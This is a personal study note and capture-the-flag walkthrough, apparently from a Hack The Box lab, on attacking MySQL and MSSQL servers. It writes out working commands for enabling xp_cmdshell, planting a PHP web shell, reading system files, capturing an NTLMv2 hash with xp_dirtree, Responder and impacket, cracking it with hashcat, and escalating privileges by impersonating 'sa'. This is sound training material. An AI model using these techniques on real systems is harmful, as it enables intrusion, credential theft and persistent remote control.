
### Enumeration

#### Banner Grabbing

```shell-session
nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

#### Authentication Mechanisms

- `Windows authentication mode` - Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. This is the default
- `mixed mode` - Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
#### Protocol Specific Attacks

Scenario: If you gained access to the database. Now you must determine the following:
1. identify existing databases
2. what tables the databases contains
3. the contents of each table

**Connecting to the SQL Server - MySQL**
```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

**Connecting to the SQL Server - Sqlcmd**
```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.

If the target is a linux MySQL, use `sqsh`
```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Or, use `mssqlclient.py` from the impacket toolset
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Windows Authentication requires you to specify the domain name or hostname of the target,
it will assume SQL Authentication and authenticate against the users created in the SQL Server. If we are targeting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

#### Default SQL Databases (`MySQL` and MSSQL)

`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

**SQL Syntax**

Show databases
```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

for sqlcmd....
 ```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

Select database
```shell-session
mysql> USE htbusers;
```

Show Tables
```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

**Select all Data from Table "users"**
```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

#### Execute Commands

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL
- xp_cmdshell is disabled by default. Enable it by using the Policy Based Management or by executing sp_configure
- Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- Control is not returned to the caller until the command-shell command is completed

**XP_CMDSHELL**
```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Enable it using the following mssql code:
```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```


#### Write Local Files

MySQL
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

secure_file_priv
- this global system variable limits the execution of data import and export operations
- permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

**Secure File Privileges**
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Write files using MSSQL by enabling Ole Automation Procedures

**MSSQL - Enable Ole Automation Procedures**
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
**MSSQL - Create a File**
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

#### Read Local Files

**Read Local Files in MSSQL**
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should
```

**MySQL - Read Local Files in MySQL**
```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

#### Capture MSSQL Service Hash

Steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

**XP_DIRTREE Hash Stealing**
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

**XP_SUBDIRS Hash Stealing**
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

#### XP_SUBDIRS Hash Stealing with Responder
```shell-session
sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

#### XP_SUBDIRS Hash Stealing with impacket
```shell-session
datboyblu3@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

#### Impersonate Existing Users with MSSQL

`IMPERSONATE`, is a SQL server special permission that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends

Use the following query to identify users we can impersonate:

**Identify Users that We Can Impersonate**
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```

**Verifying our Current User and Role**
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0
```

A return value of 0 indicates we do not have the sysadmin role. Yet, we can impersonate the sa user

**Impersonating the SA User**
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
```

Use `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. Move to the master DB with the `USE master` command.

To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

#### Communicate with Other Databases with MSSQL
Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

**Identify linked Servers in MSSQL**
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

`1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

identify the user used for the connection and its privileges. The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

### Questions

**Credentials**
```
htbdbuser
```
```
MSSQLAccess01!
```

**IP**
```
10.129.203.12
```

**NMAP**
```
nmap -Pn -sV -sC 10.129.203.12       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 14:22 EST
Nmap scan report for 10.129.203.12
Host is up (1.5s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN NAMESPACE completed CAPABILITY OK IDLE SORT IMAP4rev1 QUOTA IMAP4 ACL RIGHTS=texkA0001
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-12-17T19:25:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-12-17T18:05:21
|_Not valid after:  2053-12-17T18:05:21
| ms-sql-ntlm-info: 
|   10.129.203.12:1433: 
|     Target_Name: WIN-02
|     NetBIOS_Domain_Name: WIN-02
|     NetBIOS_Computer_Name: WIN-02
|     DNS_Domain_Name: WIN-02
|     DNS_Computer_Name: WIN-02
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.203.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-12-17T19:25:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-02
| Not valid before: 2023-12-16T18:05:15
|_Not valid after:  2024-06-16T18:05:15
| rdp-ntlm-info: 
|   Target_Name: WIN-02
|   NetBIOS_Domain_Name: WIN-02
|   NetBIOS_Computer_Name: WIN-02
|   DNS_Domain_Name: WIN-02
|   DNS_Computer_Name: WIN-02
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-17T19:25:24+00:00
Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 226.65 seconds
```

Log in with sqsh since we're on a linux machine
```
sqsh -U htbdbuser -P 'MSSQLAccess01!' -S 10.129.203.12 
```

Selecting the database. Remember we're using sqsh to log into a MSSQL instance so the syntax is a little different
```
sqsh -U htbdbuser -P 'MSSQLAccess01!' -S 10.129.203.12   
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> SELECT name FROM master.dbo.sysdatabases
2> go

        name                                                                     
        -------------------------------------------------------------------------
        master                                                                   
        tempdb                                                                   
        model                                                                    
        msdb                                                                     
        hmaildb                                                                  
        flagDB                                                                   

(6 rows affected)
1> 
```

Listing the tables in the master database
```
1> SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES
2> go

        table_name                                                               ---------------------------------------------------------------------------------
        spt_fallback_db                                                          
        spt_fallback_dev                                                         
        spt_fallback_usg                                                         
        spt_values                                                               
        spt_monitor
```

**Remember, these are the default databases for MSSQL**
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

Ok, nothing is working. I'm connecting with sqlsh but enumerating the databases doesn't appear to yield anything regarding users. Using the 'go' keyword sometimes doesn't work for some operations.

Try using impacket's mssqlclient

**mssqlclient**
```
mssqlclient.py -p 1433 htbdbuser@10.129.203.12 
```

**impacket-mssqclient**
```
impacket-mssqlclient -p 1433 htbdbuser:MSSQLAccess01!@10.129.203.12
```

Using it with the password didn't work, but omitting it and then submitting the password did:
```
impacket-mssqlclient -p 1433 htbdbuser@10.129.203.12

Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (htbdbuser  guest@master)> 
```

As the current user, htbdbuser, I can't access the flagDB database
```
SQL (htbdbuser  guest@master)> SELECT name FROM master.dbo.sysdatabases
name      
-------   
master    

tempdb    

model     

msdb      

hmaildb   

flagDB    

SQL (htbdbuser  guest@master)> SELECT table_name FROM master.INFORMATION_SCHEMA.TABLES
table_name         
----------------   
spt_fallback_db    

spt_fallback_dev   

spt_fallback_usg   

spt_values         

spt_monitor        

SQL (htbdbuser  guest@master)> USE flagDB
[-] ERROR(WIN-02\SQLEXPRESS): Line 1: The server principal "htbdbuser" is not able to access the database "flagDB" under the current security context.
SQL (htbdbuser  guest@master)> 
```

Reviewing the lesson again; I need to steal the password hash of the user. First, fire up *responder*. Responder **MUST** be running for this to work.
1. Responder
```
sudo responder -I tun1
```

2. We're XP_SUBDIRS Hash Stealing with impacket. Log into the MSSQL database and execute one of the undocumented procedures. It uses the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
```
SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.16.43\share\'
subdirectory   depth   
------------   -----   
SQL (htbdbuser  guest@master)> 
```

3. View the captured hash in the Responder terminal
```
└─$ sudo responder -I tun1
[sudo] password for dan: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun1]
    Responder IP               [10.10.16.43]
    Responder IPv6             [dead:beef:4::1029]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-AZ4FSPDLS2X]
    Responder Domain Name      [KUXO.LOCAL]
    Responder DCE-RPC Port     [48181]

[+] Listening for events...                                                                                                                                                                   

[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:f18f16677bf13c85:7F2AC4AC5C6A706A4DBA38DF4AA324ED:0101000000000000006BF4EEF430DA015A7E8D7F01EE577100000000020008004B00550058004F0001001E00570049004E002D0041005A00340046005300500044004C0053003200580004003400570049004E002D0041005A00340046005300500044004C005300320058002E004B00550058004F002E004C004F00430041004C00030014004B00550058004F002E004C004F00430041004C00050014004B00550058004F002E004C004F00430041004C0007000800006BF4EEF430DA0106000400020000000800300030000000000000000000000000300000F117544626ACDA1CC12CA017F556B393B09BE679BD5C5CC053F2488A55A497F10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00340033000000000000000000  
```


Put the hash in a text file and now use hashcat to crack it, using the rockyou.txt file
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 3794/7652 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

MSSQLSVC::WIN-02:f18f16677bf13c85:7f2ac4ac5c6a706a4dba38df4aa324ed:0101000000000000006bf4eef430da015a7e8d7f01ee577100000000020008004b00550058004f0001001e00570049004e002d0041005a00340046005300500044004c0053003200580004003400570049004e002d0041005a00340046005300500044004c005300320058002e004b00550058004f002e004c004f00430041004c00030014004b00550058004f002e004c004f00430041004c00050014004b00550058004f002e004c004f00430041004c0007000800006bf4eef430da0106000400020000000800300030000000000000000000000000300000f117544626acda1cc12ca017f556b393b09be679bd5c5cc053f2488a55a497f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340033000000000000000000:princess1
  
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: MSSQLSVC::WIN-02:f18f16677bf13c85:7f2ac4ac5c6a706a4...000000
Time.Started.....: Sun Dec 17 16:25:08 2023 (0 secs)
Time.Estimated...: Sun Dec 17 16:25:08 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    88297 H/s (0.83ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> lovers1
Hardware.Mon.#1..: Util: 24%

Started: Sun Dec 17 16:25:07 2023
Stopped: Sun Dec 17 16:25:09 2023
```

Credentials
```
mssqlsvc
```
```
princess1
```

Log into the mssql and get the flag from the flagDB

This method needs a specific windows authentication mode. I was too lazy to look it up so I went with the second option, using *sqsh*
```
impacket-mssqlclient -p 1433 mssqlsvc@10.129.203.12
```

```
sqsh -S 10.129.203.12 -U .\\mssqlsvc -P 'princess1' -h
```

Select the master db
```
SELECT name FROM master.dbo.sysdatabases
```

Use the flagDB database
```
USE flagDB
```

Enumerate the database
```
SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
```

Display the table contents
```
1> SELECT * FROM tb_flag
2> go

	HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}                                        
1> 
```



